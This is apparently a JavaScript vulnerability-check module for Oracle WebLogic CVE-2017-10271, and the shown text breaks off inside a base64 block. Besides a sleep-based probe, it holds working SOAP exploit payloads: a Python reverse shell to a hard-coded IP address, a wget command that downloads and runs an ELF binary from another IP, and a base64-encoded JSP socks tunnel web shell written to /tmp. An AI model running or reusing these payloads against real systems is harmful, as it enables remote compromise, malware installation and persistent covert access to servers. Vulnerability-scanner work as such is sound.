module.exports={
	tags:"weblogic,CVE-2017-10271,10271,3506",
	"ID":"030103",
	des:"CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
  /*<!--
    <void class="org.apache.commons.ognl.Ognl">
        <object method="getValue">
          <string><![CDATA[(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.addHeader('struts2','_struts2_'))]]></string>
          <object class="java.util.HashMap"></object>
        </object>
    </void>
    -->*/
		var _t = this,_s = this.self, szOld = url,
       // 后期完善，尝试对多个path进行测试
       aPath = '/wls-wsat/CoordinatorPortType,/wls-wsat/CoordinatorPortType11,/wls-wsat/ParticipantPortType,/wls-wsat/ParticipantPortType11,/wls-wsat/RegistrationPortTypeRPC,/wls-wsat/RegistrationPortTypeRPC11,/wls-wsat/RegistrationRequesterPortType,/wls-wsat/RegistrationRequesterPortType11'.split(',');
		var s = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java class="java.beans.XMLDecoder">
    
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
    
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

*/}),s1 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("162.219.126.11",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s2 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[echo 'PCVAcGFnZSBpbXBvcnQ9ImphdmEubmlvLkJ5dGVCdWZmZXIsIGphdmEubmV0LkluZXRTb2NrZXRBZGRyZXNzLCBqYXZhLm5pby5jaGFubmVscy5Tb2NrZXRDaGFubmVsLCBqYXZhLnV0aWwuQXJyYXlzLCBqYXZhLmlvLklPRXhjZXB0aW9uLCBqYXZhLm5ldC5Vbmtub3duSG9zdEV4Y2VwdGlvbiwgamF2YS5uZXQuU29ja2V0LGphdmEudXRpbC5IYXNoU2V0LGphdmEubmV0LkluZXRBZGRyZXNzLGphdmEubmV0Lk5ldHdvcmtJbnRlcmZhY2UsamF2YS5uZXQuU29ja2V0RXhjZXB0aW9uLGphdmEudXRpbC5FbnVtZXJhdGlvbixqYXZhLnV0aWwuSXRlcmF0b3IsamF2YS51dGlsLlNldCIgdHJpbURpcmVjdGl2ZVdoaXRlc3BhY2VzPSJ0cnVlIiU+PCUKICAgIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldEhlYWRlcigiWC1DTUQiKTsKICAgIGlmIChjbWQgIT0gbnVsbCkKICAgIHsKICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgaWYgKGNtZC5jb21wYXJlVG8oIkNPTk5FQ1QiKSA9PSAwKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBTdHJpbmcgdGFyZ2V0ID0gcmVxdWVzdC5nZXRIZWFkZXIoIlgtVEFSR0VUIik7CiAgICAgICAgICAgICAgICBpbnQgcG9ydCA9IEludGVnZXIucGFyc2VJbnQocmVxdWVzdC5nZXRIZWFkZXIoIlgtUE9SVCIpKTsKICAgICAgICAgICAgICAgIFNvY2tldENoYW5uZWwgc29ja2V0Q2hhbm5lbCA9IFNvY2tldENoYW5uZWwub3BlbigpOwogICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC5jb25uZWN0KG5ldyBJbmV0U29ja2V0QWRkcmVzcyh0YXJnZXQsIHBvcnQpKTsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuY29uZmlndXJlQmxvY2tpbmcoZmFsc2UpOwogICAgICAgICAgICAgICAgc2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInNvY2tldCIsIHNvY2tldENoYW5uZWwpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICB9IGNhdGNoIChVbmtub3duSG9zdEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgIH0gY2F0Y2ggKElPRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtRVJST1IiLCBlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIGlmIChjbWQuY29tcGFyZVRvKCJESVNDT05ORUNUIikgPT0gMCkgewogICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSAoU29ja2V0Q2hhbm5lbClzZXNzaW9uLmdldEF0dHJpYnV0ZSgic29ja2V0Iik7CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuc29ja2V0KCkuY2xvc2UoKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZXguZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBzZXNzaW9uLmludmFsaWRhdGUoKTsKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIlJFQUQiKSA9PSAwKXsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgeyAgICAgICAgICAgIAogICAgICAgICAgICAgICAgQnl0ZUJ1ZmZlciBidWYgPSBCeXRlQnVmZmVyLmFsbG9jYXRlKDUxMik7CiAgICAgICAgICAgICAgICBpbnQgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICBTZXJ2bGV0T3V0cHV0U3RyZWFtIHNvID0gcmVzcG9uc2UuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoYnl0ZXNSZWFkID4gMCl7CiAgICAgICAgICAgICAgICAgICAgc28ud3JpdGUoYnVmLmFycmF5KCksMCxieXRlc1JlYWQpOwogICAgICAgICAgICAgICAgICAgIHNvLmZsdXNoKCk7CiAgICAgICAgICAgICAgICAgICAgYnVmLmNsZWFyKCk7CiAgICAgICAgICAgICAgICAgICAgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICBzby5mbHVzaCgpOwogICAgICAgICAgICAgICAgc28uY2xvc2UoKTsgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1FUlJPUiIsIGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgLy9zb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0gICAgICAgIAogICAgICAgICAgICAKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIkZPUldBUkQiKSA9PSAwKQogICAgICAgIHsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpbnQgcmVhZGxlbiA9IHJlcXVlc3QuZ2V0Q29udGVudExlbmd0aCgpOwogICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtyZWFkbGVuXTsKCiAgICAgICAgICAgICAgICByZXF1ZXN0LmdldElucHV0U3RyZWFtKCkucmVhZChidWZmLCAwLCByZWFkbGVuKTsKICAgICAgICAgICAgICAgIEJ5dGVCdWZmZXIgYnVmID0gQnl0ZUJ1ZmZlci5hbGxvY2F0ZShyZWFkbGVuKTsKICAgICAgICAgICAgICAgIGJ1Zi5jbGVhcigpOwogICAgICAgICAgICAgICAgYnVmLnB1dChidWZmKTsKICAgICAgICAgICAgICAgIGJ1Zi5mbGlwKCk7CgogICAgICAgICAgICAgICAgd2hpbGUoYnVmLmhhc1JlbWFpbmluZygpKSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC53cml0ZShidWYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgLy9yZXNwb25zZS5nZXRPdXRwdXRTdHJlYW0oKS5jbG9zZSgpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9LyovIGluIGZpbHRlcgogICAgICAgIGVsc2UgCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICBTdHJpbmcgc3pJcCA9ICIiOwogICAgICAgICAgICAgICAgU2V0PEluZXRBZGRyZXNzPiBhZGRycyA9IG5ldyBIYXNoU2V0PEluZXRBZGRyZXNzPigpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBucyA9IE5ldHdvcmtJbnRlcmZhY2UuZ2V0TmV0d29ya0ludGVyZmFjZXMoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIE5ldHdvcmtJbnRlcmZhY2UgbiA9IG5zLm5leHRFbGVtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGlzLmhhc01vcmVFbGVtZW50cygpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEluZXRBZGRyZXNzIGkgPSBpcy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICB9CgogICAgICAgICAgICAvL1ByaW50V3JpdGVyIG8gPSByZXNwb25zZS5nZXRXcml0ZXIoKTsgIAogICAgICAgICAgICBvdXQucHJpbnQoIjwhLS0gR2Vvcmcgc2F5cywgJ0FsbCBzZWVtcyBmaW5lJyAtLT4iKTsgCiAgICAgICAgfQogICAgICAgIC8vLy8vLy8vLy8vLy8vKi8KICAgIH0vLyBpbiBqc3AKICAgIGVsc2UKICAgIHsKICAgICAgICB0cnkgewogICAgICAgIFN0cmluZyBzeklwID0gIiI7CiAgICAgICAgICAgIFNldDxJbmV0QWRkcmVzcz4gYWRkcnMgPSBuZXcgSGFzaFNldDxJbmV0QWRkcmVzcz4oKTsKICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgbnMgPSBOZXR3b3JrSW50ZXJmYWNlLmdldE5ldHdvcmtJbnRlcmZhY2VzKCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAvLyBpZ25vcmVkLi4uCiAgICAgICAgICAgIH0KICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBOZXR3b3JrSW50ZXJmYWNlIG4gPSBucy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoaXMuaGFzTW9yZUVsZW1lbnRzKCkpIHsKICAgICAgICAgICAgICAgICAgICBJbmV0QWRkcmVzcyBpID0gaXMubmV4dEVsZW1lbnQoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIC8vIGlnbm9yZWQuLi4KICAgICAgICB9CgogICAgICAgIC8vUHJpbnRXcml0ZXIgbyA9IHJlc3BvbnNlLmdldFdyaXRlcigpOyAgCiAgICAgICAgb3V0LnByaW50KCI8IS0tIEdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZScgLS0+Iik7IAogICAgfQolPg=='|base64 -d>/tmp/2188029.socks]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3o = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void id="runOut" class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[echo 'PCVAcGFnZSBpbXBvcnQ9ImphdmEubmlvLkJ5dGVCdWZmZXIsIGphdmEubmV0LkluZXRTb2NrZXRBZGRyZXNzLCBqYXZhLm5pby5jaGFubmVscy5Tb2NrZXRDaGFubmVsLCBqYXZhLnV0aWwuQXJyYXlzLCBqYXZhLmlvLklPRXhjZXB0aW9uLCBqYXZhLm5ldC5Vbmtub3duSG9zdEV4Y2VwdGlvbiwgamF2YS5uZXQuU29ja2V0LGphdmEudXRpbC5IYXNoU2V0LGphdmEubmV0LkluZXRBZGRyZXNzLGphdmEubmV0Lk5ldHdvcmtJbnRlcmZhY2UsamF2YS5uZXQuU29ja2V0RXhjZXB0aW9uLGphdmEudXRpbC5FbnVtZXJhdGlvbixqYXZhLnV0aWwuSXRlcmF0b3IsamF2YS51dGlsLlNldCIgdHJpbURpcmVjdGl2ZVdoaXRlc3BhY2VzPSJ0cnVlIiU+PCUKICAgIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldEhlYWRlcigiWC1DTUQiKTsKICAgIGlmIChjbWQgIT0gbnVsbCkKICAgIHsKICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgaWYgKGNtZC5jb21wYXJlVG8oIkNPTk5FQ1QiKSA9PSAwKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBTdHJpbmcgdGFyZ2V0ID0gcmVxdWVzdC5nZXRIZWFkZXIoIlgtVEFSR0VUIik7CiAgICAgICAgICAgICAgICBpbnQgcG9ydCA9IEludGVnZXIucGFyc2VJbnQocmVxdWVzdC5nZXRIZWFkZXIoIlgtUE9SVCIpKTsKICAgICAgICAgICAgICAgIFNvY2tldENoYW5uZWwgc29ja2V0Q2hhbm5lbCA9IFNvY2tldENoYW5uZWwub3BlbigpOwogICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC5jb25uZWN0KG5ldyBJbmV0U29ja2V0QWRkcmVzcyh0YXJnZXQsIHBvcnQpKTsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuY29uZmlndXJlQmxvY2tpbmcoZmFsc2UpOwogICAgICAgICAgICAgICAgc2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInNvY2tldCIsIHNvY2tldENoYW5uZWwpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICB9IGNhdGNoIChVbmtub3duSG9zdEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgIH0gY2F0Y2ggKElPRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtRVJST1IiLCBlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIGlmIChjbWQuY29tcGFyZVRvKCJESVNDT05ORUNUIikgPT0gMCkgewogICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSAoU29ja2V0Q2hhbm5lbClzZXNzaW9uLmdldEF0dHJpYnV0ZSgic29ja2V0Iik7CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuc29ja2V0KCkuY2xvc2UoKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZXguZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBzZXNzaW9uLmludmFsaWRhdGUoKTsKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIlJFQUQiKSA9PSAwKXsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgeyAgICAgICAgICAgIAogICAgICAgICAgICAgICAgQnl0ZUJ1ZmZlciBidWYgPSBCeXRlQnVmZmVyLmFsbG9jYXRlKDUxMik7CiAgICAgICAgICAgICAgICBpbnQgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICBTZXJ2bGV0T3V0cHV0U3RyZWFtIHNvID0gcmVzcG9uc2UuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoYnl0ZXNSZWFkID4gMCl7CiAgICAgICAgICAgICAgICAgICAgc28ud3JpdGUoYnVmLmFycmF5KCksMCxieXRlc1JlYWQpOwogICAgICAgICAgICAgICAgICAgIHNvLmZsdXNoKCk7CiAgICAgICAgICAgICAgICAgICAgYnVmLmNsZWFyKCk7CiAgICAgICAgICAgICAgICAgICAgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICBzby5mbHVzaCgpOwogICAgICAgICAgICAgICAgc28uY2xvc2UoKTsgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1FUlJPUiIsIGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgLy9zb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0gICAgICAgIAogICAgICAgICAgICAKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIkZPUldBUkQiKSA9PSAwKQogICAgICAgIHsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpbnQgcmVhZGxlbiA9IHJlcXVlc3QuZ2V0Q29udGVudExlbmd0aCgpOwogICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtyZWFkbGVuXTsKCiAgICAgICAgICAgICAgICByZXF1ZXN0LmdldElucHV0U3RyZWFtKCkucmVhZChidWZmLCAwLCByZWFkbGVuKTsKICAgICAgICAgICAgICAgIEJ5dGVCdWZmZXIgYnVmID0gQnl0ZUJ1ZmZlci5hbGxvY2F0ZShyZWFkbGVuKTsKICAgICAgICAgICAgICAgIGJ1Zi5jbGVhcigpOwogICAgICAgICAgICAgICAgYnVmLnB1dChidWZmKTsKICAgICAgICAgICAgICAgIGJ1Zi5mbGlwKCk7CgogICAgICAgICAgICAgICAgd2hpbGUoYnVmLmhhc1JlbWFpbmluZygpKSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC53cml0ZShidWYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgLy9yZXNwb25zZS5nZXRPdXRwdXRTdHJlYW0oKS5jbG9zZSgpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9LyovIGluIGZpbHRlcgogICAgICAgIGVsc2UgCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICBTdHJpbmcgc3pJcCA9ICIiOwogICAgICAgICAgICAgICAgU2V0PEluZXRBZGRyZXNzPiBhZGRycyA9IG5ldyBIYXNoU2V0PEluZXRBZGRyZXNzPigpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBucyA9IE5ldHdvcmtJbnRlcmZhY2UuZ2V0TmV0d29ya0ludGVyZmFjZXMoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIE5ldHdvcmtJbnRlcmZhY2UgbiA9IG5zLm5leHRFbGVtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICAgICAgd2hpb